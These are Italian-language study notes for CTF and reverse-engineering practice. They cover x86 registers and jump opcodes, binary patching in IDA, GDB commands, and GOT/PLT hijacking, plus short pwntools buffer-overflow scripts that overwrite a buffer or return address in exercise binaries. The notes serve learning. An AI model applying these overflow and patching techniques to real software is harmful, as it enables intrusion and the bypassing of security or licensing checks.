# Ordine dei Registri 
|Ordine|Registro|Ruolo tipico|
|------|--------|------------|
|1|**RDI**|	Primo argomento	|
|2|**RSI**|	Secondo argomento	|
|3|**RDX**|	Terzo argomento	|
|4|**RCX**|	Quarto argomento	|
|5|**R8**|Quinto argomento	|
|6|**R9**|Sesto argomento	|

# Salti 
## A. Salti uguaglianza 
|istruzione|sinonimo|significato|logica|
|----------|--------|-----------|------|
|je        |jz      |Jump if Equal / Zero|if (x == y)|
|jne|jnz|Jump if Not Equal|if (x != y)|

## B. Salti con Numeri CON SEGNO
|istruzione|significato|logica|
|----------|-----------|------|
|jl	|Jump if Less|	if (x < y)|
|jle|	Jump if Less or Equal|	if (x <= y)|
|jg	|Jump if Greater|	if (x > y)|
|jge|	Jump if Greater or Equal|	if (x >= y)|
|jbe|Jump if Below or Equal| if(x <= y)

## C. Salti con Numeri SENZA SEGNO (Unsigned)
|istruzione|significato|logica|
|----------|-----------|------|
|jb	|Jump if Below	|if ((unsigned)x < y)|
|ja	|Jump if Above	|if ((unsigned)x > y)|
|jae	|Jump if Above or Equal	|if ((unsigned)x >= y)|

## D. salto
|istruzione|significato|hex|
|----------|-----------|------|
|jmp       |salta e basta|EB|

# codici brutti di assembly
|istruzione|significato|cosa fa|
|----------|-----------|-------|
|shr|Shift Logical Right|Sposta il bit a destra, da usare per numeri senza segno|
|sar|Shift Arithmetic Right|Sposta il bit a destra, ma se ha segno negativo, resta negativo|
|imul|moltiplica due numeri|imul eax, ebx = A = A * B|

# Patching

## Codici del patching
http://www.unixwiz.net/techtips/x86-jumps.html

## Note: 
### Come fare patching
- posizionati sul comando che vuoi cambiare
- vai nell'HEX e trova il codice corrispondende
- Usa il link sopra per capire con che codice lo vuoi sostituire
- Vai su edit -> patch program -> change byte
- Una volta sostituito tutto quello che devi, vai su edit -> patch program -> Apply patches to input file

opzione 2: usa il sito https://hexed.it ed esporta la nuova versione

se si vuole forzare una variabile ad essere 1, si può fare lo xor. Il valore dell xor è 31, mentre C0 è eax, sostituendo tre esadecimali con 2 resta uno spazio vuoto che va colmato con il nop (90) altrimenti da errore.


per sostituire e creare lo xor: 
- uso un registro a 64 bit -> 48
- uso un registro a 32 bit -> niente prefisso
il byte successivo è 31 e il prossimo identifica la variabile di registro

|Valore (Binario)|Valore (Decimale)|Registro (64-bit)|Registro (32-bit)|
|----------------|-----------------|-----------------|-----------------|
|000             |0                |RAX              |              EAX|
|001             |1                |RCX              |              ECX|
|010             |2                |RDX              |              EDX|
|011             |3                |RBX              |              EBX|
|100             |4                |RSP              |              ESP|
|101             |5                |RBP              |              EBP|
|110             |6                |RSI              |              ESI|
|111             |7                |RDI              |              EDI|

# GDB
per iniziare il gdb 

```
gdb ./nomeExe
```
quali funzioni ci sono
```
info functions
```

inserisci breakpoin, diciamo a GDB di fermarsi appena inizia il main, così possiamo guardare in giro prima che il programma finisca. Questo inserisce l'istruzione 0xCC nel codice.
```
break main
```

esegui l'exe
```
run
```

controlla variabili o funzioni
```
info variables
info functions
```

vedere l'assembly
```
disassemble funzione
```

leggere una variabile
```
x/s &flag //guarda la stringa che si trova all'indirizzo di flag
printf "%s", (char*) flag //guarda il contenuto di flag
print $eax //o il registro dov'è locato quello che cerchi se è un int

//se uno no funziona, usa l'altro
```
eseguire una funzione
```
jump funzione
```

# Fare PWN
guardo da IDA lo spazio allocato al buffer e lo riempio tutto, in base al codice sottostante capisco come agire affinché lo sovrascriva. Esempio:

  char s[64]; // [esp+1Ch] [ebp-44h] BYREF \
  _BYTE s1[4]; // [esp+5Ch] [ebp-4h] BYREF

allora so che s ha 64 caratteri e s1 ne ha 4, andando avanti nel codice 
```
gets(s);
  if ( !memcmp(s1, "H!gh", 4u) )
  {
    puts("Good! here's the flag");
    print_flag();
  }
  else
  {
    puts("Your josh is low!\nBye!");
  }
```

allora riempio s con 64 A e poi scrivo H!gh per far valere l'if.

a volte è "necessario" scrivere uno script in python per risolvere l'esercizio, lascio dei codici utilizzati:
```
from pwn import *
target_address = p64(0x4007a2) 
garbage = b'java' + b'a'*28 
msgin = garbage + target_address 
p = process('./java') 
p.sendline(msgin) 
p.interactive() 

```
```
from pwn import * 
garbage = 'a' * 64 
msg = 'H!gh' 
msgin = garbage + msg 
p = process('./pwn0') 
p.sendline(msgin) 
msgout = p.recvall() 
print('output:\t', msgout) 
```
ricorda, metti l'indirizzo dell'ultimo argomento per la funzione che stai chiamando o i valori non saranno ancora inizializzati e saranno garbage

## Shellcode
metto dei codici utili, questo serve per ottenere l'indirizzo di una parola cercata
  ```
  from pwn import *

  elf = ELF('./pwn1')

  target_address = elf.symbols['shell']
  print ('target address:\t', hex(target_address))
  ```

### Nota: perché funziona?
- bisogna uscire dal buffer, quindi intanto si mettono i byte necessari indicati
- si guarda se è a 32 o 64 quindi si calcola il base pointer che è di 64/8 = 8 o 32/8 = 0
- si mette l'indirizzo sul quale si vuole andare che è o di 8 o di 4 in base alla base che si sta usando (32 o 64)
- si controlla che tutti i blocchi coprano i 16 byte altrimenti si mettono altri di padding
- controllare che funzioni non abbiano cose del genere   ```fgets(msg, 0x32, stdin); ``` qui si controlla che il messaggio inserito non sia maggiore di 0x32 in hex, che in decimale sono 50

# GOT e PLT
GOT (Global Offset Table) = contiene gli indirizzi reali delle funzioni e risiede in memoria
PLT (Procedure Linkage Table) = sistema di inoltro chiamate, esempio. se faccio  ```call puts``` in realtà faccio ```puts@plt```, la PLT guarda dentro la GOT, prende l'indirizzo reale e ci salta
una vulnerabilità ci permette di scrivere dove vogliamo per modificare la GOT -> possiamo linkare un'aòtra funzione al posto di quella precedente e cambiare il corso del programma. 
per trovare gli indirizzi delle funzioni continua ad usare py che è più semplice, ma ricorda che per funzioni che stanno in un area diversa di memoria dal codice devi usare ```elf.got``` e non ```elf.symbol```